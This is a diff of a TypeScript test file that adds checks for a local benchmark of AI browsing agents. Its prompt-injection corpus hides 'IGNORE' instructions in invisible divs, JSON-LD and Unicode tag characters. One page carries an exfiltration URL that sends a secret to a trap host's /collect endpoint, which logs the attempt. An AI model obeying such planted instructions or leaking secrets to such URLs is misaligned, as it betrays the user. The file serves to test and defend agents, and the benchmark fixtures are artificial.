@@ -3,6 +3,7 @@
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
 import { agentReference } from './agent-tasks.ts';
 import { AGENT_CANARY, AGENT_HOSTS, AGENT_TRAP_TYPED_PATH } from './sites/agent-sites.ts';
+import { BENCH_HOSTS, BENCH_INJECTION_CANARY, BENCH_INJECTION_SECRET, benchInjectionReference, benchStepsContacts, classifyTrapHits, INJECTION_CORPUS, STEP_MUTATIONS } from './sites/bench-sites.ts';
 import { startClient, type Client, type Res } from './test-helpers.ts';
 
 const H = (name: string): string => `zz_test_${name}.localhost`;
@@ -228,7 +229,9 @@ const contracts: Record<string, Contract> = {
     const res = await fx.get(H('irregular'), '/');
     expect(res.status).toBe(200);
     expect(res.body).not.toContain('</html>');
-    expect(res.body).not.toContain('</title>');
+    // Seul <title> est fermé (retouche 2.8) : en HTML5 un titre non fermé avale tout le document (RCDATA).
+    expect(res.body).toContain('</title>');
+    expect(res.body).not.toContain('</body>');
     expect(res.body).toContain('<td>');
     expect(res.body).toContain('N/C');
     expect(res.body.match(/id=r0/g)?.length).toBeGreaterThan(1);
@@ -566,6 +569,93 @@ const contracts: Record<string, Contract> = {
     expect(await count(AGENT_HOSTS.trap, '/collect')).toBe(1);
     expect((await fx.get(host, AGENT_TRAP_TYPED_PATH)).status).toBe(204);
     expect(await count(host, AGENT_TRAP_TYPED_PATH)).toBe(1);
+  },
+
+  // ------------------------------------------------------------------ lot « bench » (banc 2.8, 15 §11)
+  async bench_injection() {
+    const host = BENCH_HOSTS.injection;
+    const index = (await fx.get(host, '/')).body;
+    for (const entry of INJECTION_CORPUS) expect(index).toContain(`href="${entry.path}"`);
+    expect(INJECTION_CORPUS.map((entry) => entry.technique).sort()).toEqual(['exfil_url', 'hidden_text', 'invisible_unicode', 'json_ld']);
+    const reference = benchInjectionReference();
+    expect(reference.items).toHaveLength(5);
+    for (const entry of INJECTION_CORPUS) {
+      const body = (await fx.get(host, entry.path)).body;
+      // Données légitimes complètes : la référence reste atteignable malgré la charge hostile.
+      for (const item of reference.items) expect(body, entry.id).toContain(item.id);
+      expect(body, entry.id).toContain(BENCH_INJECTION_CANARY);
+      // Aucune page du corpus n’embarque de ressource externe ni de mécanisme de résolution de défi.
+      expect(body, entry.id).not.toMatch(/captcha|(?:src|href)="https?:/i);
+    }
+    expect((await fx.get(host, '/hidden_text')).body).toMatch(/<div style="display:none">[^<]*IGNORE/);
+    const ld = blob((await fx.get(host, '/json_ld')).body, /<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
+    expect(JSON.stringify(JSON.parse(ld))).toContain(BENCH_INJECTION_CANARY);
+    const unicode = (await fx.get(host, '/invisible_unicode')).body;
+    expect(unicode).toContain('\u200b');
+    expect(/[\u{E0000}-\u{E007F}]/u.test(unicode)).toBe(true);
+    const exfil = (await fx.get(host, '/exfil_url')).body;
+    expect(exfil).toContain(BENCH_INJECTION_SECRET);
+    expect(exfil).toMatch(new RegExp(`http://${BENCH_HOSTS.trap}:\\d+/collect\\?v=`));
+    // Le piège journalise chaque requête (chemin et requête) : tentative, et exfiltration si la valeur secrète y figure.
+    expect((await fx.get(BENCH_HOSTS.trap, '/collect?v=rien')).status).toBe(204);
+    expect((await fx.get(BENCH_HOSTS.trap, `/collect?v=${BENCH_INJECTION_SECRET}`)).status).toBe(204);
+    const log = obj(await setSite('bench_injection', { action: 'trap_log' }));
+    const hits = (log['result'] as { hits: { path: string; query: string }[] }).hits;
+    expect(hits).toHaveLength(2);
+    expect(classifyTrapHits(hits)).toEqual({ attempts: 2, exfiltrations: 1 });
+    await fx.reset();
+    expect(((obj(await setSite('bench_injection', { action: 'trap_log' }))['result']) as { hits: unknown[] }).hits).toEqual([]);
+  },
+
+  async bench_steps() {
+    const host = BENCH_HOSTS.steps;
+    const contacts = benchStepsContacts();
+    expect(contacts).toHaveLength(9);
+    const pageOf = async (p: number): Promise<string> => (await fx.get(host, `/?p=${p}`)).body;
+    const ids = (html: string): string[] => [...html.matchAll(/\((zz_test_person_\d{3})\)/g)].map((m) => m[1] ?? '');
+    // Sans mutation : 3 contacts par page, indicateur, bouton « Suivant » sans href qui navigue par script.
+    let first = await pageOf(1);
+    expect(ids(first)).toEqual(contacts.slice(0, 3).map((c) => c.id));
+    expect(first).toContain('Page 1 / 3');
+    expect(first).toMatch(/<button type="button" id="next"[^>]*>Suivant<\/button>/);
+    expect(ids(await pageOf(3))).toEqual(contacts.slice(6, 9).map((c) => c.id));
+    const mutate = async (mutation: string): Promise<void> => {
+      expect((await setSite('bench_steps', { mutation })).status, mutation).toBe(200);
+    };
+    await mutate('rename_label');
+    first = await pageOf(1);
+    expect(first).toMatch(/>Page suivante<\/button>/);
+    expect(first).not.toMatch(/>Suivant<\/button>/);
+    await mutate('move_element');
+    expect(await pageOf(1)).toMatch(/<header>[\s\S]*id="next"[\s\S]*<\/header>[\s\S]*<ul id="list">/);
+    await mutate('insert_overlay');
+    expect(await pageOf(1)).toMatch(/<div class="zz-overlay" role="dialog"/);
+    await mutate('duplicate_label');
+    expect((await pageOf(1)).match(/>Suivant<\/button>/g)).toHaveLength(2);
+    await mutate('inert_element');
+    first = await pageOf(1);
+    expect(first).toMatch(/id="next"/);
+    expect(first).not.toContain('location.href');
+    await mutate('stale_data');
+    expect(ids(await pageOf(2))).toEqual(ids(await pageOf(1)));
+    await mutate('challenge_midway');
+    expect(ids(await pageOf(1))).toHaveLength(3);
+    const midway = await pageOf(2);
+    expect(midway).toContain('zz-test-challenge');
+    expect(midway).not.toMatch(/<script|<form|captcha/i);
+    await mutate('weaken_post');
+    expect(await pageOf(2)).not.toContain('Page 2 / 3');
+    await mutate('legit_empty');
+    first = await pageOf(1);
+    expect(ids(first)).toEqual([]);
+    expect(first).toContain('Aucun contact');
+    await mutate('insert_submit');
+    expect(await pageOf(1)).toMatch(/<form method="post" action="\/confirm">/);
+    expect(await count(host, '/confirm')).toBe(0);
+    expect((await fx.call(host, 'POST', '/confirm')).status).toBe(303);
+    expect(await count(host, '/confirm')).toBe(1);
+    expect((await setSite('bench_steps', { mutation: 'inconnue' })).status).toBe(400);
+    expect([...STEP_MUTATIONS]).toHaveLength(10);
   },
 };
 
